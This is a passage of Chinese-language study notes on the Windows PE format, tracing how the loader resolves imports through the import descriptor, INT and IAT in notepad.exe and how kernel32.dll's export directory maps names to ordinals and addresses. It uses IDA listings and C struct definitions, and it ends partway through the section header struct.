<p>这个数组一共有9项,下标0到8,每项大小相同都是14h=20d,这样算下来这个数组大小是20*9=180字节</p>
<blockquote>
<p>然而刚才DataDirectory的Import项中,Size=200.这表明ImportDescriptor[]应该有10项.</p>
<p>回到010editor观察ImportDescriptor[8]之后的编码</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220712112522955.png"
alt="image-20220712112522955" />
<figcaption aria-hidden="true">image-20220712112522955</figcaption>
</figure>
<p>发现ImportDescriptor[8]后面还有20个自己都是0</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220712112658025.png"
alt="image-20220712112658025" />
<figcaption aria-hidden="true">image-20220712112658025</figcaption>
</figure>
<p>也就是说ImportDescriptor[9]全空</p>
</blockquote>
<p><strong>现在的问题是,ImportDescriptor[]数组是干啥的呢?</strong></p>
<blockquote>
<h6
id="datadirectory1.virtualaddress-importdescriptor">DataDirectory[1].VirtualAddress-&gt;&amp;ImportDescriptor[]</h6>
<p><strong>DataDirectory[1]是数据目录 的
第二项,或者说导入目录表项</strong></p>
<p><strong>DataDirectory[1].VirtualAddress指向ImportDescriptor导入描述符表的基址</strong></p>
<blockquote>
<p>_IMAGE_IMPORT_DESCRIPTOR结构体数组ImportDescriptor[],也可以叫做IMPORT
Directory Table</p>
<p>各种叫法还有指针瞎j8值的关系,一定要分清</p>
</blockquote>
<p>ImportDescriptor[]在节区之后,不属于PE头.</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/PE.jpg"
alt="PE" />
<figcaption aria-hidden="true">PE</figcaption>
</figure>
<blockquote>
<p>权威指南:</p>
<p>IMAGE_IMPORT_DESCRIPTOR结构体ImportDescriptor[],</p>
<p>其中记录着PE文件要导入哪些库文件,程序需要多少导入个库,就需要有多少个ImportDescriptor项目,这些项目组成数组,数组最后一项全空</p>
<p>这和我们刚才观察到的是相吻合的</p>
</blockquote>
<p>IID是给PE装载器用的,先贴上PE装载器的干活步骤</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220712121817219.png"
alt="image-20220712121817219" />
<figcaption aria-hidden="true">image-20220712121817219</figcaption>
</figure>
<blockquote>
<p>其中IID是<code>_IMAGE_IMPORT_DESCRIPTOR</code>的缩写</p>
<p>INT是<code>import name table</code>导入名称表的缩写,也就是IID中OriginalFIrstThunk指向的地址</p>
<p>IAT是import address table
导入地址表,也就是ida反汇编之后的.idata区</p>
<p>关于INT和IAT,权位指南也给了一张图,但是属于"会的一看就明白,不会的看了还是不会(出自祭祖老师顾新)"那种</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220712124021808.png"
alt="image-20220712124021808" />
<figcaption aria-hidden="true">image-20220712124021808</figcaption>
</figure>
<p>这个图怎么看呢?</p>
<p>最左边这个是一个IID结构体,也就是ImportDescriptor[]的一项</p>
<p>其中Name="Kernel32.dll",这是一个DLL库名,表明本IID的作用是导入DLL库中的函数</p>
<p>OriginalFirstThunk指向INT表基址,这个INT表实际上是<code>_IMAGE_IMPORT_BY_NAME</code>结构体数组,每一项都由一个Hint和一个字符串名组成,每个库函数都有自己的名字,比如GetCurrentThreadld,也有在库中的唯一的编号放在Hint中</p>
<p>FirstThunk指向IAT表基址,这个IAT表就是用ida观察时,.idata区中extern声明的函数.</p>
<p>对于一个库,其对应INT和IAT表中的表项应该是一样多的,意思就是需要使用几个函数就解析几个函数地址,多一个也不干</p>
<p>程序text正文代码段调用库函数时就是call
idata区中的"函数",就像<code>call    ds:DragFinish</code>.那么idata区的"函数"应当是一个地址,</p>
<p>然而动态库是在程序装载时,运行前装载的,此时已经经过了编译链接,显然即使动态库已经映射进入进程的虚拟地址空间了,但是调用库函数的地方还是不知道库函数在哪里.</p>
<p>这就好比我虽然和058班同学在同一所大学,但是我不知道sjf在哪个宿舍住,我想上门拜访一下却不知道应该去哪里</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">      WORD Hint;<span class="comment">//按照Hint编号加载函数</span></span><br><span class="line">      CHAR Name[<span class="number">1</span>];<span class="comment">//</span></span><br><span class="line">    &#125; IMAGE_IMPORT_BY_NAME,*PIMAGE_IMPORT_BY_NAME;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">  __C89_NAMELESS <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">DWORD Characteristics;</span><br><span class="line">DWORD OriginalFirstThunk;<span class="comment">//指向INT数组基地址</span></span><br><span class="line">  &#125; DUMMYUNIONNAME;</span><br><span class="line">  DWORD TimeDateStamp;</span><br><span class="line"></span><br><span class="line">  DWORD ForwarderChain;</span><br><span class="line">  DWORD Name;<span class="comment">//动态库名称,注意不是函数名称</span></span><br><span class="line">  DWORD FirstThunk;<span class="comment">//指向IAT数组基地址</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure>
<p>下面根据权威指南中给出PE装载器导入函数的步骤,跟踪观察一下</p>
<p>1.读取IID的Name成员,获取库名称</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220712130001523.png"
alt="image-20220712130001523" />
<figcaption aria-hidden="true">image-20220712130001523</figcaption>
</figure>
<p>以ImportDescriptor[0]为例,其Name成员指向RVA=71A4,用ida观察0x10071A4这个位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:010071A4 aComdlg32Dll    db &#x27;comdlg32.dll&#x27;,0     ; DATA XREF: .text:01006D2C↑o</span><br></pre></td></tr></table></figure>
<p>确实是comdlg32.dll字符串</p>
<p>2.LoadLibrary("comdlg32.dll"),返回值是comdlg32.dll库的句柄,该句柄将会用于库中查函数</p>
<p>3.读取IID的OriginalFiristThunk成员,获取INT表地址</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220712130506645.png"
alt="image-20220712130506645" />
<figcaption aria-hidden="true">image-20220712130506645</figcaption>
</figure>
<p>OriginalFiristThunk=0x7088h,用ida观察0x1007088这个位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:01007088 ;</span><br><span class="line">.text:01007088 ; Import names for comdlg32.dll</span><br><span class="line">.text:01007088 ;</span><br><span class="line">.text:01007088 off_1007088     dd rva word_1007172     ; DATA XREF: .text:__IMPORT_DESCRIPTOR_comdlg32↑o</span><br><span class="line">.text:0100708C                 dd rva word_1007156</span><br><span class="line">.text:01007090                 dd rva word_1007196</span><br><span class="line">.text:01007094                 dd rva word_1007148</span><br><span class="line">.text:01007098                 dd rva word_1007134</span><br><span class="line">.text:0100709C                 dd rva word_1007182</span><br><span class="line">.text:010070A0                 dd rva word_1007162</span><br><span class="line">.text:010070A4                 dd rva word_100710C</span><br><span class="line">.text:010070A8                 dd rva word_100711C</span><br><span class="line">.text:010070AC                 dd 0</span><br></pre></td></tr></table></figure>
<p>ida也给出了注释"comdlg32.dll库需要导入函数的名称",</p>
<p>需要注意的是INT表的最后一项是0,也就是NULL,它的作用是判断INT表是否结束</p>
<p>4.对于INT表的第i项,</p>
<blockquote>
<p>第0项就是<code>.text:01007088 off_1007088     dd rva word_1007172</code></p>
<p>第1项就是<code>.text:0100708C                 dd rva word_1007156</code></p>
<p>...</p>
</blockquote>
<p>根据<code>_IMAGE_IMPORT_BY_NAME</code>结构体的Name值,PE装载器调用<code>GetProcAddress(&lt;动态库句柄&gt;,"&lt;函数名&gt;")</code>获取该名称对应函数的地址(此地址为在整个进程虚拟地址空间中的地址,也就是绝对虚拟地址,<strong>不是</strong>相对于动态库基址的偏移量)</p>
<p>比如其中word_1007172指向一个_IMAGE_IMPORT_BY_NAME结构体</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:01007172 word_1007172    dw 0Fh                  ; DATA XREF: .text:off_1007088↑o</span><br><span class="line">.text:01007174                 db &#x27;PageSetupDlgW&#x27;,0</span><br></pre></td></tr></table></figure>
<p><code>Hint=0Fh</code></p>
<p><code>Name="PageSetupDlgW"</code>,一个函数名</p>
<p>然后PE装载器调用<code>GetProcAddress(comdlg32.dll句柄号,"PageSetupDlgW");</code>就获得了该函数的虚拟地址</p>
<p>5.根据IID的FirstThunk成员,获取对应IAT表地址</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220712131357758.png"
alt="image-20220712131357758" />
<figcaption aria-hidden="true">image-20220712131357758</figcaption>
</figure>
<p>comdlg32.dll的FirstThunk=12A0,用ida观察0x10012A0这个地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.idata:010012A0 ; Imports from comdlg32.dll</span><br><span class="line">.idata:010012A0 ;</span><br><span class="line">.idata:010012A0 ; BOOL __stdcall PageSetupDlgW(LPPAGESETUPDLGW)</span><br><span class="line">.idata:010012A0                 extrn PageSetupDlgW:dword</span><br><span class="line">.idata:010012A0                                         ; CODE XREF: NPCommand(x,x,x)+29F↓p</span><br><span class="line">.idata:010012A0                                         ; GetPrinterDCviaDialog()+2C↓p ...</span><br><span class="line">.idata:010012A4 ; HWND __stdcall FindTextW(LPFINDREPLACEW)</span><br><span class="line">.idata:010012A4                 extrn FindTextW:dword   ; CODE XREF: NPCommand(x,x,x)+471↓p</span><br><span class="line">.idata:010012A4                                         ; DATA XREF: NPCommand(x,x,x)+471↓r</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>每项占4个字节,也就是一个int,一个指针类型,显然要写入一个函数地址</p>
<p>6.将4中获取到的PageSetupDlgW<strong>的地址</strong>写到5中的相应IAT表项中去</p>
<p>假设PageSetupDlgW的地址为0x12345678,四个字节,写到.idata区的<code>0x10012A0</code>开始的四个字节</p>
<table>
<thead>
<tr>
<th>地址</th>
<th>数据</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x10012A0</td>
<td>0x78</td>
</tr>
<tr>
<td>0x10012A1</td>
<td>0x56</td>
</tr>
<tr>
<td>0x10012A2</td>
<td>0x34</td>
</tr>
<tr>
<td>0x10012A3</td>
<td>0x12</td>
</tr>
</tbody>
</table>
<p>小端模式</p>
<blockquote>
<p>这里PageSetupDlgW的地址是我们假设的GetProcAddress的返回值,其实际值可以用ollydbg动态调试观察</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220712132332297.png"
alt="image-20220712132332297" />
<figcaption aria-hidden="true">image-20220712132332297</figcaption>
</figure>
<p>实际上PageSetupDlgW被装载在进程虚拟地址空间的<code>0x503D5A75</code>.</p>
</blockquote>
<p>7.重复4-6直到遭遇INT最后一项0</p>
<p>到此貌似了解了整个库函数符号解析的过程,回忆整个过程</p>
<p>编译器和链接器不会解析动态库的符号,</p>
<p>在text节正文代码上call的是ds:[库函数名],实际上是call这个<strong>地址上存放的地址</strong>,</p>
<p>ds:[库函数名]是.idata区的IAT表,每个IAT条目四个字节,将来要存放一个实际的库函数地址</p>
<p>编译器和链接器会记录没有解析的外部符号,放到DataDirectory[1]指向的<code>_IMAGE_IMPORT_DESCRIPTOR</code>数组中,</p>
<p>每一个需要导入的库都在本数组中建立一个表项,每个表项记录要装载哪个库(Name),还有要装载这个库的哪些函数(指向<code>_IMAGE_IMPORT_BY_NAME</code>数组即INT表的指针).还有哪个地方需要解析这个库里的函数(指向.idata段IAT表基址的指针)</p>
<p>每个INT表表项都要记录,要装载哪个函数,该函数的Hint</p>
<p>但是但是,PE装载器是怎么从DLL库中找到函数地址的呢?</p>
</blockquote>
<blockquote>
<blockquote>
<p>符号解析可以分为三个阶段</p>
<p>1.编译时</p>
<p>编译器负责将本文件中的引用解析到本文件中的实现,比如</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	func();</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="comment">//do something...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>main前面这个func就是一个引用,它的作用是给编译器说,有这么一个func函数,但只是有,func具体干了啥,编译器不知道.</p>
<p>编译器会首先发现第一行的引用,然后在本文件中找实现,显然可以找到实现,于是就有了func的PC相对地址,再main中调用func时就可以</p>
<p>汇编成<code>call 相对地址</code>的格式</p>
<blockquote>
<p>这个引用是必须的,去掉之后会发生意想不到的运行时错误</p>
<p>比如</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// void func();</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">int</span> a=func();</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="comment">//do something...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样可以通过编译,但是显然func没有返回值.提前声明void
func();再编译会直接编译报错.</p>
</blockquote>
<p>2.链接时</p>
<p>一个模块可能会引用其他模块中的符号,比如全局变量或者函数</p>
<p>比如下面这个程序</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">int</span> other;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">int</span> a=other;</span><br><span class="line">	func();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译器发现other是个外部符号,func虽然没有表明extern但是本模块中找不到实现.</p>
<p>而编译器只负责将一个一个孤立的模块编译,将他们链接起来不是编译器的事,</p>
<p>于是编译器就为other和func都生成一个符号链接表项,把这个皮球踢给链接器完成</p>
<p>链接器首先进行符号解析,它会遍历每个模块,每找到一个全局符号就看看符号链接表中有没有他的引用,有则这个引用就可以落地.全遍历一遍之后还有不能解析的引用则报链接错</p>
<p>符号解析完毕之后就是重定位,将多个参与链接的目标模块合并成一个大目标模块</p>
<p>3.运行时</p>
<p>这就是IAT或者说GOT,PLT发挥作用的时候</p>
</blockquote>
</blockquote>
<h6 id="datadirectory0export">DataDirectory[0]=Export</h6>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220714145105577.png"
alt="image-20220714145105577" />
<figcaption aria-hidden="true">image-20220714145105577</figcaption>
</figure>
<p>类比DataDirectory[1]导入表,导入表的作用是将动态库中的函数导入</p>
<p>那么导出表就应该把本模块中的函数向外导出,提供给其他模块使用,也就是本模块作为动态库</p>
<p><code>notepad.exe</code>是一个引用程序,显然不是动态库,自然没有导出的函数,那么<code>DataDirectory[0]</code>就是个空记录</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220712142026145.png"
alt="image-20220712142026145" />
<figcaption aria-hidden="true">image-20220712142026145</figcaption>
</figure>
<p>可以通过观察<code>kernel32.dll</code>动态库,了解<code>Export</code>表怎么干活</p>
<blockquote>
<p>notepad.exe和kernel32.dll都是直接从windowsXP虚拟机的C:/Windows/System32下面拽出来的</p>
</blockquote>
<blockquote>
<p>notepad.exe和kernel32.dll的整体对比</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220712145612859.png"
alt="image-20220712145612859" />
<figcaption aria-hidden="true">image-20220712145612859</figcaption>
</figure>
</blockquote>
<p>导出表<code>ExportDir</code>至多有一个,但是导入表可以有多个</p>
<p>因为一个应用程序可能需要多个动态库支持,而一个动态库只需要一个导出表导出自身函数</p>
<p><strong>kernel32.dll</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PE头</span><br><span class="line">	NT头</span><br><span class="line">		可选头</span><br><span class="line">			数据目录表[0]=Export表</span><br><span class="line">				-&gt;AddressOfFunctions</span><br><span class="line">				-&gt;AddressOfNames</span><br><span class="line">				-&gt;AddressOfNameOrdinals</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220714223418977.png"
alt="image-20220714223418977" />
<figcaption aria-hidden="true">image-20220714223418977</figcaption>
</figure>
<p>两个表项,分别是相对虚拟地址0x22140h和十进制表示的大小27016</p>
<p>由于ImageBase为0x77e40000h,因此实际虚拟地址就是0x77e62140</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220714144520852.png"
alt="image-20220714144520852" />
<figcaption aria-hidden="true">image-20220714144520852</figcaption>
</figure>
<p>如果使用ida就观察0x77e62140这个位置</p>
<p>如果使用010editor就观察0x21540这个位置</p>
<p>这个位置就是<code>IMAGE_EXPORT_DIRECTORY</code>结构体的起始地址,这个结构体是干啥的呢?</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">  DWORD Characteristics;</span><br><span class="line">  DWORD TimeDateStamp;<span class="comment">//该文件编译完成的事件</span></span><br><span class="line">  WORD MajorVersion;</span><br><span class="line">  WORD MinorVersion;</span><br><span class="line">  DWORD Name;<span class="comment">//库名</span></span><br><span class="line">  DWORD Base;</span><br><span class="line">  DWORD NumberOfFunctions;<span class="comment">//库函数的个数</span></span><br><span class="line">  DWORD NumberOfNames;<span class="comment">//有名字的库函数的个数</span></span><br><span class="line">  DWORD AddressOfFunctions;<span class="comment">//</span></span><br><span class="line">  DWORD AddressOfNames;<span class="comment">//函数名称数组地址</span></span><br><span class="line">  DWORD AddressOfNameOrdinals;<span class="comment">//名称顺序表地址</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY,*PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure>
<p>NumberOfFunctions和NumberOfNames,在kernel32.dll中数量相同,都是928,也就是说导出了928个函数,每个函数都有名字</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220714152432702.png"
alt="image-20220714152432702" />
<figcaption aria-hidden="true">image-20220714152432702</figcaption>
</figure>
<p>这就很奇怪了,</p>
<p><strong>一是为啥函数要有名字?</strong></p>
<p><strong>二是,为啥每个函数都有名字了还要记录一个名字数量和一个函数数量,两个不相同吗?</strong></p>
<p>在<strong>可执行目标文件exe</strong>中,确实不需要函数有名字,要调用函数,只需要call
函数地址.函数名字就是一个写源代码时的助记符</p>
<p>但是库文件不一样,库需要为别的exe文件或者库提供支持.</p>
<p>动态库在exe装载时才会映射进入进程虚拟地址空间,然后进行动态链接.</p>
<p>我们已经在自己的模块源代码中写了"MessageBox"这种动态库中的函数符号,显然静态解析解决不了这个符号.</p>
<p>那么动态链接的时候怎么解析这个事情呢?</p>
<blockquote>
<p><strong>我的想法是</strong>,在exe中保留需要调用的库函数的名字,在dll中导出库函数的名字,并且和地址挂钩.动态链接器在解析exe中动态库函数名字时,就像查字典一样,exe中看一眼,要解析MessageBox,再去dll中遍历所有[库函数名,地址]键值对,查到就把地址写到exe的相应位置.</p>
<p>但是如果库函数很多,库函数名很长,匹配库函数名还是字符串匹配,那么遍历库函数表的效率会很低.并且这样做完全没有必要</p>
<p>可以给每个函数编一个号,比如MessageBox编号1,MessageBoxW编号2,以此类推,这就好比建立了一个协议,exe需要一个一号函数,动态解析器就去dll库中索要1号函数,dll库和exe都知道1号函数是MessageBox.而动态链接器相当于中间信道,它没必要知道MessageBox-&gt;1-&gt;MessageBox这个过程</p>
</blockquote>
<p>而实际上人家是怎么解决这个问题的呢?</p>
<p>回顾notepad.exe<strong>导入表</strong>的情形,<code>_IMAGE_IMPORT_BY_NAME</code>有两个成员,</p>
<p>第一个Hint,就是函数编号.</p>
<p>第二个,Name,函数名</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220714152202138.png"
alt="image-20220714152202138" />
<figcaption aria-hidden="true">image-20220714152202138</figcaption>
</figure>
<p>和它门当户对的ExportByName是啥样的呢?只记住了一个函数名</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220714152703198.png"
alt="image-20220714152703198" />
<figcaption aria-hidden="true">image-20220714152703198</figcaption>
</figure>
<p>奇怪了,ExportByName比ImportByName少一个Hint成员,这是为啥呢?</p>
<p>观察一下notepad.exe的ImportByName[0]:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220714152850743.png"
alt="image-20220714152850743" />
<figcaption aria-hidden="true">image-20220714152850743</figcaption>
</figure>
<p>这里Hint是489,这不禁让人浮想联翩,这个数是怎么来的呢?</p>
<p>会不会是ExportByName数组的下标?回家看看吧</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220714152949332.png"
alt="image-20220714152949332" />
<figcaption aria-hidden="true">image-20220714152949332</figcaption>
</figure>
<p>还真是,<code>ImportByName[0].Hint</code>就是<code>GlobalUnlock</code>函数在<code>ExportByName</code>中的下标</p>
<p>显然在notepad.exe这种应用程序中使用函数名Name或者函数下标Hint导入动态库的函数都可以达到链接目的</p>
<p>到此貌似就了解了动态链接干活的过程,然而还有两个问题没有解决,</p>
<p>1.为啥NumberOfNames和NumberOfFunctions值相同,但是要记两个</p>
<p>2._IMAGE_EXPORT_DIRECTORY的AddressOfNameOrdinals成员貌似还没有发挥作用</p>
<p>核心原理给出的动态链接器的工作过程:</p>
<p>1.动态链接器从exe的ImportByName[x]拿到函数名Name</p>
<p>2.动态链接器遍历dll的ExportByName[]数组,用Name匹配每一项的函数名</p>
<p>3.如果匹配到,记录此时在ExportByName中的下标i</p>
<p>4.用i去查dll的AddressOfNameOridinals指向的数组,用刚才得到的下标i作为下标查AddressOfNameOridinals数组,得到AddressOfNameOridinals[i]=INDEX,这是下标</p>
<p>5.用新下标INDEX(AddressOfNameOridinals[i])去查AddressOfFunctions,得到AddressOfFunctions[INDEX]得到Name函数的相对虚拟地址</p>
<blockquote>
<p>如果按照之前认为的hint就是函数下标的方法,那么这个想象的过程应该是</p>
<p>1.动态链接器从exe的ImportByName[x]拿到函数名Name</p>
<p>2.动态链接器遍历dll的ExportByName[]数组,用Name匹配每一项的函数名</p>
<p>3.如果匹配到,记录此时在ExportByName中的下标i</p>
<p>4.用下标i去查AddressOfFunctions,得到AddressOfFunctions[i]得到Name函数的相对虚拟地址</p>
</blockquote>
<p>而实际的方法多查了一个AddressOfNameOridinals表,这是为啥呢?</p>
<p>还又得回到NumberOfFunction和NumberOfName,这俩值一定一样吗?</p>
<p>重新考虑动态库的导出函数一定要有名字吗?</p>
<p>如果exe能够根据ImportByName.hint找到该函数,完全可以不用名字</p>
<p>那么动态库导出的函数就可以有匿名函数.</p>
<p>这时匿名函数就不能使用ExportByName机制了,因为它根本没名字.</p>
<p>如果每个函数都有名字,那么显然AddressOfNameOrdinals,AddressOfFunctions,AddressOfNames都有相同数量的表项</p>
<p>如果有一个匿名函数,那么AddressOfNames就得少一项.</p>
<p>AddressOfFunctions数组啃腚记载了所有数组的地址,包括匿名的和有名的</p>
<p>AddressOfNameOrdinals从名字上看,名称序列,它实际完成了一个下标转换.<strong>一个有名字的函数,在所有函数中的下标是多少</strong></p>
<p>而AddressOfNames是记录,一个函数名对应的下标是多少</p>
<p>整个映射过程是这样的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">函数名	-&gt;查AddressOfNames-&gt;函数在AddressOfNames中的下标</span><br><span class="line">		-&gt;查AddressOfNameOrdinals-&gt;函数在所有库函数中的下标</span><br><span class="line">		-&gt;查AddressOfFunctions-&gt;函数相对虚拟地址</span><br><span class="line"></span><br><span class="line">匿名函数在所有库函数中的下标-&gt;查AddressOfFunctions-&gt;函数相对虚拟地址</span><br></pre></td></tr></table></figure>
<p>那么AddressOfNameOrdinals的项数应该和AddressOfNames相同,有多少个具名函数,ordinal就得提供多少个映射服务</p>
<blockquote>
<p>用ida观察kernel32.dll的AddressOfOrdinals表,由于所有函数具名,因此AddressOfOrdinals实际上完成了一个<span
class="math inline">\(f(x)=x\)</span>的映射,</p>
<p>第一个具名函数就是kernel32中所有函数的第一个函数</p>
<p>第n个具名函数就是kernel32中所有函数的第n个函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:77E63E68 ; Export Ordinals Table for KERNEL32.dll</span><br><span class="line">.text:77E63E68 ;</span><br><span class="line">.text:77E63E68 byte_77E63E68   db 2 dup(0), 1, 0, 2, 0, 3, 0, 4, 0, 5, 0, 6, 0, 7, 0</span><br><span class="line">.text:77E63E68                                         ; DATA XREF: .text:77E62164↑o</span><br><span class="line">.text:77E63E68                 db 8, 0, 9, 0, 0Ah, 0, 0Bh, 0, 0Ch, 0, 0Dh, 0, 0Eh, 0</span><br><span class="line">.text:77E63E68                 db 0Fh, 0, 10h, 0, 11h, 0, 12h, 0, 13h, 0, 14h, 0, 15h</span><br><span class="line">.text:77E63E68                 db 0, 16h, 0, 17h, 0, 18h, 0, 19h, 0, 1Ah, 0, 1Bh, 0, 1Ch</span><br><span class="line">.text:77E63E68                 db 0, 1Dh, 0, 1Eh, 0, 1Fh, 0, 20h, 0, 21h, 0, 22h, 0, 23h</span><br><span class="line">.text:77E63E68                 db 0, 24h, 0, 25h, 0, 26h, 0, 27h, 0, 28h, 0, 29h, 0, 2Ah</span><br><span class="line">.text:77E63E68                 db 0, 2Bh, 0, 2Ch, 0, 2Dh, 0, 2Eh, 0, 2Fh, 0, 30h, 0, 31h</span><br><span class="line">.text:77E63E68                 db 0, 32h, 0, 33h, 0, 34h, 0, 35h, 0, 36h, 0, 37h, 0, 38h</span><br></pre></td></tr></table></figure>
<p>显然对于一个所有函数都具名的动态库kernel32,AddressOfNameOrdinals是纯纯的five.</p>
<p>但是总是得照顾一些搞特殊的动态库</p>
</blockquote>
<blockquote>
<p>AddressOfFunctions又叫EAT,export address table</p>
</blockquote>
<h3 id="节区头表">节区头表</h3>
<p>节区头表,或者叫做"节头表",实际上是节区头结构体数组</p>
<p>数组的每个元素都是一个节区头</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">     BYTE Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">     <span 